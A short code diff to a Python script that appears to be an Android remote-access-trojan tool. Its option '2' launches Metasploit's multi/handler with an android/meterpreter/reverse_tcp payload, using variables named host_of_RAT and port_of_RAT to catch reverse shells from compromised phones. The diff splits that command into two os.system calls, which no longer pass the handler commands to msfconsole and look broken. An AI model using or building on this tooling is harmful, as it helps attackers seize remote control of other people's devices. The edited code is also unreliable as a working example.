@@ -22,12 +22,6 @@ def Start():
 
 
     if input_options == "2":
-        os.system(f"msfconsole && use multi/handler && set payload android/meterpreter/reverse_tcp && set lhost {host_of_RAT} && set lport {port_of_RAT} && exploit")
+        os.system("msfconsole")
+        os.system(f"use multi/handler && set payload android/meterpreter/reverse_tcp && set lhost {host_of_RAT} && set lport {port_of_RAT} && exploit")
 
-
-
-
-
-
-
-Start()
